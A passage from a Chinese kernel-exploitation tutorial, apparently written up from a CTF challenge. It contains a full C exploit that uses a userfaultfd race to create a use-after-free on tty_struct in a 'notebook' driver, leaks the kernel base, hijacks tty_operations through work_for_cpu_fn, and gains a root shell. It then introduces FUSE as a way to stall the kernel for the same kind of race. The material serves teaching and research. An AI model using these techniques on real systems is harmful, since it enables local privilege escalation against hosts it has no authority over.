<p>现在我们考虑如何进行提权的工作，按惯例我们需要 <code>commit_creds(prepare_kernel_cred(NULL))</code> ，不过我们很难直接一步执行到位，因此需要分步执行并保存中间结果</p>
<p>这里我们选择使用 <code>work_for_cpu_fn()</code> 完成利用，在开启了多核支持的内核中都有这个函数，定义于 <code>kernel/workqueue.c</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span><br>    <span class="hljs-type">long</span> (*fn)(<span class="hljs-type">void</span> *);<br>    <span class="hljs-type">void</span> *arg;<br>    <span class="hljs-type">long</span> ret;<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> work_struct *work)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_for_cpu</span> *<span class="hljs-title">wfc</span> =</span> container_of(work, <span class="hljs-keyword">struct</span> work_for_cpu, work);<br><br>    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>简单分析可知该函数可以理解为如下形式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">work_for_cpu_fn</span><span class="hljs-params">(<span class="hljs-type">size_t</span> * args)</span><br>&#123;<br>    args[<span class="hljs-number">6</span>] = ((<span class="hljs-type">size_t</span> (*) (<span class="hljs-type">size_t</span>)) (args[<span class="hljs-number">4</span>](args[<span class="hljs-number">5</span>]));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>即 <code>rdi + 0x20</code> 处作为函数指针执行，参数为 <code>rdi + 0x28</code> 处值，返回值存放在 <code>rdi + 0x30</code> 处，而 <code>tty_operations</code> 上的函数指针的第一个参数大都是 <code>tty_struct</code> ，对我们而言是可控的，由此我们可以<strong>很方便地分次执行 prepare_kernel_cred 和 commit_creds，且不用考虑 KPTI 绕过，直接普通地返回用户态便能完成稳定化提权</strong></p>
<p>需要注意的是 <code>tty_struct</code> 的结构也被我们所破坏了，因此在完成提权之后我们应该将其内容恢复原样</p>
<h4 id="③-FINAL-EXPLOIT"><a href="#③-FINAL-EXPLOIT" class="headerlink" title="③ FINAL EXPLOIT"></a>③ FINAL EXPLOIT</h4><p>最终的 exp 如下所示（<code>kernelpwn.h</code> 见本文开头）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;kernelpwn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTM_UNIX98_OPS 0xffffffff81e8e440</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PTY_UNIX98_OPS 0xffffffff81e8e320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810a9b40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a9ef0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WORK_FOR_CPU_FN 0xffffffff8109eb90</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NOTE_NUM 0x10</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> &#123;</span><br>    <span class="hljs-type">size_t</span> idx;<br>    <span class="hljs-type">size_t</span> size;<br>    <span class="hljs-type">char</span> * buf;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> &#123;</span><br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">size_t</span> size;<br>&#125;;<br><br><span class="hljs-type">int</span> note_fd;<br><span class="hljs-type">sem_t</span> evil_add_sem, evil_edit_sem;<br><span class="hljs-type">char</span> *uffd_buf;<br><span class="hljs-type">char</span> temp_page[<span class="hljs-number">0x1000</span>] = &#123; <span class="hljs-string">&quot;arttnba3&quot;</span> &#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteAdd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteDel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x200</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteEdit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">char</span> * buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .idx = idx,<br>        .size = size,<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">0x300</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">noteGift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Note</span> <span class="hljs-title">note</span> =</span> &#123;<br>        .buf = buf,<br>    &#125;;<br>    ioctl(note_fd, <span class="hljs-number">100</span>, &amp;note);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteRead</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> read(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">noteWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> write(note_fd, buf, idx);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">fixSizeByAdd</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span><br>&#123;<br>    sem_wait(&amp;evil_add_sem);<br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x60</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">void</span>* <span class="hljs-title function_">constructUAF</span><span class="hljs-params">(<span class="hljs-type">void</span> * args)</span><br>&#123;<br>    sem_wait(&amp;evil_edit_sem);<br>    noteEdit(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, uffd_buf);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">KernelNotebook</span> <span class="hljs-title">kernel_notebook</span>[<span class="hljs-title">NOTE_NUM</span>];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tty_operations</span> <span class="hljs-title">fake_tty_ops</span>;</span><br>    <span class="hljs-type">pthread_t</span> uffd_monitor_thread, add_fix_size_thread, edit_uaf_thread;<br>    <span class="hljs-type">size_t</span> fake_tty_struct_data[<span class="hljs-number">0x100</span>], tty_ops, orig_tty_struct_data[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">size_t</span> tty_struct_addr, fake_tty_ops_addr;<br>    <span class="hljs-type">int</span> tty_fd;<br><br>    <span class="hljs-comment">/* fundamental infastructure */</span><br>    saveStatus();<br>    bindCore(<span class="hljs-number">0</span>);<br><br>    sem_init(&amp;evil_add_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    sem_init(&amp;evil_edit_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* open dev */</span><br>    note_fd = open(<span class="hljs-string">&quot;/dev/notebook&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (note_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open /dev/notebook!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* register userfaultfd */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] register userfaultfd...&quot;</span>);<br><br>    uffd_buf = (<span class="hljs-type">char</span> *) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, <br>                            MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFdForThreadStucking(&amp;uffd_monitor_thread, uffd_buf,<span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* get a tty-size object */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] allocating tty_struct-size object...&quot;</span>);<br><br>    noteAdd(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">&quot;arttnba3rat3bant&quot;</span>);<br>    noteEdit(<span class="hljs-number">0</span>, TTY_STRUCT_SIZE, temp_page);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * construct UAF by userfaultfd.</span><br><span class="hljs-comment">     * Note that we need to sleep(1) there to wait for the kfree() to be done,</span><br><span class="hljs-comment">     * so that the UAF object can be regetted later.</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] constructing UAF on tty_struct...&quot;</span>);<br><br>    pthread_create(&amp;edit_uaf_thread, <span class="hljs-literal">NULL</span>, constructUAF, <span class="hljs-literal">NULL</span>);<br>    pthread_create(&amp;add_fix_size_thread, <span class="hljs-literal">NULL</span>, fixSizeByAdd, <span class="hljs-literal">NULL</span>);<br><br>    sem_post(&amp;evil_edit_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fix notebook[0]-&gt;size.</span><br><span class="hljs-comment">     * Note that we need to sleep(1) there to wait for the `size` to be fixed.</span><br><span class="hljs-comment">    */</span><br>    sem_post(&amp;evil_add_sem);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* leak kernel_base by tty_struct */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel_base by tty_struct&quot;</span>);<br><br>    tty_fd = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR| O_NOCTTY);<br>    noteRead(<span class="hljs-number">0</span>, orig_tty_struct_data);<br><br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) orig_tty_struct_data != <span class="hljs-number">0x5401</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to hit the tty_struct!&quot;</span>);<br>    &#125;<br><br>    tty_ops = orig_tty_struct_data[<span class="hljs-number">3</span>];<br>    kernel_offset = ((tty_ops &amp; <span class="hljs-number">0xfff</span>) == (PTY_UNIX98_OPS &amp; <span class="hljs-number">0xfff</span>) <br>                       ? (tty_ops - PTY_UNIX98_OPS) : tty_ops - PTM_UNIX98_OPS);<br>    kernel_base += kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Kernel offset: \033[0m0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Kernel base: \033[0m0x%lx\n&quot;</span>, kernel_base);<br><br>    <span class="hljs-comment">/* construct fake tty_ops */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] construct fake tty_operations...&quot;</span>);<br><br>    fake_tty_ops.ioctl = kernel_offset + WORK_FOR_CPU_FN;<br>    noteAdd(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, temp_page);<br>    noteEdit(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> tty_operations), temp_page);<br>    noteWrite(<span class="hljs-number">1</span>, &amp;fake_tty_ops);<br><br>    <span class="hljs-comment">/* get kernel addr of tty_struct and tty_ops by gift */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel heap addr by gift...&quot;</span>);<br><br>    noteGift(&amp;kernel_notebook);<br>    tty_struct_addr = kernel_notebook[<span class="hljs-number">0</span>].ptr;<br>    fake_tty_ops_addr = kernel_notebook[<span class="hljs-number">1</span>].ptr;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] tty_struct at 0x%lx\n&quot;</span>, tty_struct_addr);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] fake_tty_ops at 0x%lx\n&quot;</span>, fake_tty_ops_addr);<br><br>    <span class="hljs-comment">/* prepare_kernel_cred(NULL) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] triger commit_creds(prepare_kernel_cred(NULL)) and fix tty...&quot;</span>);<br><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    fake_tty_struct_data[<span class="hljs-number">3</span>] = fake_tty_ops_addr;<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + PREPARE_KERNEL_CRED;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = <span class="hljs-literal">NULL</span>;<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(tty_fd, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-comment">/* commit_creds(&amp;root_cred) */</span><br>    noteRead(<span class="hljs-number">0</span>, fake_tty_struct_data);<br>    fake_tty_struct_data[<span class="hljs-number">4</span>] = kernel_offset + COMMIT_CREDS;<br>    fake_tty_struct_data[<span class="hljs-number">5</span>] = fake_tty_struct_data[<span class="hljs-number">6</span>];<br>    fake_tty_struct_data[<span class="hljs-number">6</span>] = orig_tty_struct_data[<span class="hljs-number">6</span>];<br><br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    ioctl(tty_fd, <span class="hljs-number">233</span>, <span class="hljs-number">233</span>);<br><br>    <span class="hljs-comment">/* fix tty_struct */</span><br>    <span class="hljs-built_in">memcpy</span>(fake_tty_struct_data, orig_tty_struct_data, <span class="hljs-number">0x2e0</span>);<br>    noteWrite(<span class="hljs-number">0</span>, fake_tty_struct_data);<br><br>    <span class="hljs-comment">/* pop root shell */</span><br>    getRootShell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>运行即可完成稳定化提权</p>
<p><img src="https://s2.loli.net/2023/02/07/SbkgTuyZ9oJHRxw.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="FUSE-race"><a href="#FUSE-race" class="headerlink" title="FUSE race"></a>FUSE race</h2><blockquote>
<p>FUSE 的基本信息参考 <a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/fast17/fast17-vangoor.pdf">To FUSE or Not to FUSE: Performance of User-Space File Systems</a>，也可以参考<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/143256077">知乎上的这篇文章</a>，基于 FUSE 的利用则可以参考<a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/01/cve-2022-0185.html">CVE-2022-0185</a></p>
<blockquote>
<p>注：最好先了解 VFS 相关的一些基本知识</p>
</blockquote>
</blockquote>
<h3 id="FUSE-简介"><a href="#FUSE-简介" class="headerlink" title="FUSE 简介"></a>FUSE 简介</h3><p>前面讲到，自 Linux kernel 5.11 版本起，非特权用户被禁止使用 userfaultfd 系统调用，但是<strong>我们仍能通过 FUSE 达成同样的效果</strong></p>
<p>我们先来介绍 FUSE —— <em>Filesystem in Userspace</em> ，即<strong>用户空间文件系统</strong>，该功能<strong>允许非特权用户在用户空间实现一个用户态文件系统</strong>，开发者只需要实现对应的文件操作接口就可以在用户空间实现一个文件系统，而不需要重新编译内核，这给开发者提供了相当的便利</p>
<p>FUSE 自 Linux 2.6.14 版本引入，主要由两部分组成：</p>
<ul>
<li>FUSE 内核模块，负责与 kernel 的 VFS 进行交互，并向用户空间实现的文件系统进程暴露 <code>/dev/fuse</code> 块设备接口</li>
<li><a target="_blank" rel="noopener" href="https://github.com/libfuse/libfuse">用户空间的 libfuse 库</a> 负责向用户程序提供封装好的接口，开发者基于该库进行用户空间文件系统的开发：由一个 FUSE daemon 守护进程负责与内核模块进行交互并进行文件系统的具体操作</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/06/zDwY7GMZQkE2c9m.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE 的基本运行原理如下：</p>
<ul>
<li>FUSE daemon 守护进程通过 libfuse 库的 <code>fuse_main()</code> 注册文件系统与对应的处理函数，并挂载到对应的目录下（例如 <code>/mnt/fuse</code>）</li>
<li>用户进程访问挂载点下的文件（例如 <code>/mnt/fuse/file</code>），来到内核中的 VFS 对应 inode 的 <code>inode_operations</code> 中的处理函数，交由 FUSE 内核模块进行处理</li>
<li>FUSE 内核模块将请求转换为与用户态 daemon 进程间约定的格式，交由用户态对应的 FUSE daemon 守护进程进行处理</li>
<li>在 FUSE daemon 调用文件系统创建时注册的对应的处理函数，这一步可能会需要访问实际的文件系统（如 <code>ext4</code>，看文件系统具体定义，你也可以写成一个纯内存的文件系统（笑））</li>
<li>FUSE daemon 完成处理，返回结果至 FUSE 内核模块，再经由 VFS 返回给用户进程</li>
</ul>
<p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>FUSE 内部还有更为复杂的结构，如五个处理队列等，但这暂时不是我们本篇需要关注的，我们主要关注如何用 FUSE 来完成利用就行（笑）</p>
<p><img src="https://s2.loli.net/2023/01/10/Mq4UcEBXPTfr7vA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="FUSE-基本用法"><a href="#FUSE-基本用法" class="headerlink" title="FUSE 基本用法"></a>FUSE 基本用法</h3><p>借助 libfuse 库，FUSE 的用法其实还是比较简单的，首先是安装基本的依赖项：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install libfuse2 libfuse-dev</span><br></code></pre></td></tr></table></figure>

<p>我们首先需要自定义一张 <code>fuse_operations</code> 函数表，并实现对应的函数接口（例如，如果我们的文件系统要实现创建文件夹的功能，我们应当在函数表中实现 <code>mkdir()</code> 接口），我们自定义的用户态文件系统的操作<strong>其实都是通过对该函数表中定义的相应函数进行回调完成的</strong>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 太长，这里就不放完了</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fuse_operations</span> &#123;</span><br>	<span class="hljs-type">int</span> (*getattr) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-keyword">struct</span> stat *);<br>	<span class="hljs-type">int</span> (*readlink) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">char</span> *, <span class="hljs-type">size_t</span>);<br>	<span class="hljs-type">int</span> (*getdir) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">fuse_dirh_t</span>, <span class="hljs-type">fuse_dirfil_t</span>);<br>	<span class="hljs-type">int</span> (*mknod) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">mode_t</span>, <span class="hljs-type">dev_t</span>);<br>	<span class="hljs-type">int</span> (*mkdir) (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">mode_t</span>);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>这里笔者写一个简单的用户态文件系统作为示例，例如我们可以实现如下两个接口：</p>
<ul>
<li><code>getattr</code> 用以获取文件属性，对于根目录 <code>&quot;/&quot;</code> （相对于挂载点而言）而言我们返回 <code>0755 | S_IFDIR</code> 属性，否则返回 <code>0644 | S_IFREG</code> 属性</li>
<li><code>readdir</code> 用以遍历目录，这里我们仅支持遍历根目录 <code>&quot;/&quot;</code>，返回结果显示在根目录下有一个测试文件，我们可以使用 <code>filler()</code> 函数填充单个文件结果</li>
</ul>
<p>之后我们使用 <code>fuse_main()</code> 将其挂载到指定目录下即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 标识使用的 